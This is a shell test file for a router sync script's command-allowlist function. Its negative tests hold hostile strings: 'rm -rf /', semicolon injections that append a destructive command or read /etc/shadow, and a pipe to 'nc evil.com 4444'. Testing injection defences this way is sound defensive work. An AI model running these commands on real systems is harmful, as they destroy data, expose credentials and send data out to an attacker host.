#!/bin/sh
# test/test_router_sync.sh - Tests router/sync.sh functions

set -e

# Extract helper functions from router/sync.sh into a test environment
eval "$(sed -n '/^parse_json_field()/,/^}/p' router/sync.sh)"
eval "$(sed -n '/^parse_command()/,/^}/p' router/sync.sh)"
eval "$(sed -n '/^parse_mac()/,/^}/p' router/sync.sh)"
eval "$(sed -n '/^is_command_safe()/,/^}/p' router/sync.sh)"

echo "Testing parse_command..."

# 1. Test parsing valid command with sed/jsonfilter
JSON_AUTH='{"command":"ndsctl auth 00:11:22:33:44:55 60"}'
PARSED_AUTH=$(parse_command "$JSON_AUTH")
if [ "$PARSED_AUTH" != "ndsctl auth 00:11:22:33:44:55 60" ]; then
    echo "FAIL: Expected 'ndsctl auth 00:11:22:33:44:55 60', got '$PARSED_AUTH'"
    exit 1
fi

JSON_NULL='{"command":null}'
PARSED_NULL=$(parse_command "$JSON_NULL")
if [ -n "$PARSED_NULL" ] && [ "$PARSED_NULL" != "null" ]; then
    echo "FAIL: Expected empty or 'null', got '$PARSED_NULL'"
    exit 1
fi

echo "Testing parse_mac..."

# 1. Test parsing plain text MAC
PLAIN_MAC="b6:30:f7:f7:11:60"
PARSED_PLAIN=$(parse_mac "$PLAIN_MAC")
if [ "$PARSED_PLAIN" != "b6:30:f7:f7:11:60" ]; then
    echo "FAIL: Expected 'b6:30:f7:f7:11:60', got '$PARSED_PLAIN'"
    exit 1
fi

# 2. Test parsing JSON MAC
JSON_MAC='{"mac":"b6:30:f7:f7:11:60"}'
PARSED_JSON=$(parse_mac "$JSON_MAC")
if [ "$PARSED_JSON" != "b6:30:f7:f7:11:60" ]; then
    echo "FAIL: Expected 'b6:30:f7:f7:11:60', got '$PARSED_JSON'"
    exit 1
fi

echo "Testing is_command_safe security whitelist..."

# Allowed commands
if ! is_command_safe "ndsctl auth 00:11:22:33:44:55 60"; then
    echo "FAIL: Should allow 'ndsctl auth 00:11:22:33:44:55 60'"
    exit 1
fi

if ! is_command_safe "ndsctl auth aa:bb:cc:dd:ee:ff 0"; then
    echo "FAIL: Should allow 'ndsctl auth aa:bb:cc:dd:ee:ff 0'"
    exit 1
fi

if ! is_command_safe "ndsctl deauth 00:11:22:33:44:55"; then
    echo "FAIL: Should allow 'ndsctl deauth 00:11:22:33:44:55'"
    exit 1
fi

if ! is_command_safe "ndsctl trust 00:11:22:33:44:55"; then
    echo "FAIL: Should allow 'ndsctl trust 00:11:22:33:44:55'"
    exit 1
fi

if ! is_command_safe "ndsctl untrust 00:11:22:33:44:55"; then
    echo "FAIL: Should allow 'ndsctl untrust 00:11:22:33:44:55'"
    exit 1
fi

if ! is_command_safe "reboot"; then
    echo "FAIL: Should allow 'reboot'"
    exit 1
fi

if ! is_command_safe "echo 3 > /proc/sys/vm/drop_caches"; then
    echo "FAIL: Should allow 'echo 3 > /proc/sys/vm/drop_caches'"
    exit 1
fi

if ! is_command_safe "uci set wireless.radio0.disabled='1' && uci commit wireless && wifi reload"; then
    echo "FAIL: Should allow 'uci set wireless.radio0.disabled='1' && uci commit wireless && wifi reload'"
    exit 1
fi

if ! is_command_safe "uci set wireless.radio1.txpower='23' && uci commit wireless && wifi reload"; then
    echo "FAIL: Should allow 'uci set wireless.radio1.txpower='23' && uci commit wireless && wifi reload'"
    exit 1
fi

if ! is_command_safe "uci set wireless.radio0.channel='6' && uci commit wireless && wifi reload"; then
    echo "FAIL: Should allow 'uci set wireless.radio0.channel...'"
    exit 1
fi

if ! is_command_safe "uci set wireless.radio0.htmode='HT40' && uci commit wireless && wifi reload"; then
    echo "FAIL: Should allow 'uci set wireless.radio0.htmode...'"
    exit 1
fi

if ! is_command_safe "uci set wireless.default_radio0.ssid='Archer_C6_2.4G' && uci commit wireless && wifi reload"; then
    echo "FAIL: Should allow 'uci set wireless.default_radio0.ssid...'"
    exit 1
fi

if ! is_command_safe "uci set wireless.guest.disabled='0' && uci commit wireless && wifi reload"; then
    echo "FAIL: Should allow 'uci set wireless.guest.disabled...'"
    exit 1
fi

if ! is_command_safe "iptables -I FORWARD 1 -m mac --mac-source 00:11:22:33:44:55 -j DROP"; then
    echo "FAIL: Should allow 'iptables -I FORWARD 1 -m mac --mac-source 00:11:22:33:44:55 -j DROP'"
    exit 1
fi

if ! is_command_safe "iptables -D FORWARD -m mac --mac-source 00:11:22:33:44:55 -j DROP"; then
    echo "FAIL: Should allow 'iptables -D FORWARD -m mac --mac-source 00:11:22:33:44:55 -j DROP'"
    exit 1
fi

if ! is_command_safe "etherwake -i br-lan 00:11:22:33:44:55"; then
    echo "FAIL: Should allow 'etherwake -i br-lan 00:11:22:33:44:55'"
    exit 1
fi

if ! is_command_safe "uci set dhcp.host_001122334455=host && uci commit dhcp"; then
    echo "FAIL: Should allow 'uci set dhcp...'"
    exit 1
fi

if ! is_command_safe "uci delete dhcp.host_001122334455 && uci commit dhcp"; then
    echo "FAIL: Should allow 'uci delete dhcp...'"
    exit 1
fi

if ! is_command_safe "uci set firewall.@defaults[0].flow_offloading='1'"; then
    echo "FAIL: Should allow 'uci set firewall.@defaults[0].flow_offloading...'"
    exit 1
fi

if ! is_command_safe "/etc/init.d/firewall restart"; then
    echo "FAIL: Should allow '/etc/init.d/firewall restart'"
    exit 1
fi

if ! is_command_safe "uci set sqm.@queue[0].enabled='1'"; then
    echo "FAIL: Should allow 'uci set sqm.@queue[0].enabled...'"
    exit 1
fi

if ! is_command_safe "/etc/init.d/sqm restart"; then
    echo "FAIL: Should allow '/etc/init.d/sqm restart'"
    exit 1
fi

if ! is_command_safe "ifup wg0"; then
    echo "FAIL: Should allow 'ifup wg0'"
    exit 1
fi

if ! is_command_safe "ifdown wg0"; then
    echo "FAIL: Should allow 'ifdown wg0'"
    exit 1
fi

if ! is_command_safe "/etc/init.d/mwan3 restart"; then
    echo "FAIL: Should allow '/etc/init.d/mwan3 restart'"
    exit 1
fi

if ! is_command_safe "/etc/init.d/https-dns-proxy start"; then
    echo "FAIL: Should allow '/etc/init.d/https-dns-proxy start'"
    exit 1
fi

if ! is_command_safe "uci set archer_guard.quota.total_gb='50' && uci commit archer_guard"; then
    echo "FAIL: Should allow 'uci set archer_guard.quota...'"
    exit 1
fi

if ! is_command_safe "wrtbwmon reset"; then
    echo "FAIL: Should allow 'wrtbwmon reset'"
    exit 1
fi

if ! is_command_safe "/etc/init.d/cron restart"; then
    echo "FAIL: Should allow '/etc/init.d/cron restart'"
    exit 1
fi

if ! is_command_safe "echo '0 4 * * * /sbin/reboot' >> /etc/crontabs/root"; then
    echo "FAIL: Should allow crontabs append"
    exit 1
fi

# Disallowed / malicious commands
if is_command_safe "rm -rf /"; then
    echo "FAIL: Should reject malicious command 'rm -rf /'"
    exit 1
fi

if is_command_safe "ndsctl auth 00:11:22:33:44:55; rm -rf /"; then
    echo "FAIL: Should reject injection 'ndsctl auth ...; rm -rf /'"
    exit 1
fi

if is_command_safe "reboot; cat /etc/shadow"; then
    echo "FAIL: Should reject injection 'reboot; cat /etc/shadow'"
    exit 1
fi

if is_command_safe "echo 3 > /proc/sys/vm/drop_caches | nc evil.com 4444"; then
    echo "FAIL: Should reject piped command 'drop_caches | nc'"
    exit 1
fi

if is_command_safe "iptables -I FORWARD 1 -m mac --mac-source 00:11:22:33:44:55; rm -rf / -j DROP"; then
    echo "FAIL: Should reject injected iptables rule"
    exit 1
fi

if is_command_safe "ndsctl auth invalid-mac 60"; then
    echo "FAIL: Should reject malformed MAC"
    exit 1
fi

echo "Testing kick_wifi_client safely handles calls..."
eval "$(sed -n '/^kick_wifi_client()/,/^}/p' router/sync.sh)"
# Calling with empty MAC or non-existent ubus/iw should not crash or return non-zero
kick_wifi_client ""
kick_wifi_client "00:11:22:33:44:55"

echo "All router/sync.sh shell tests passed successfully!"
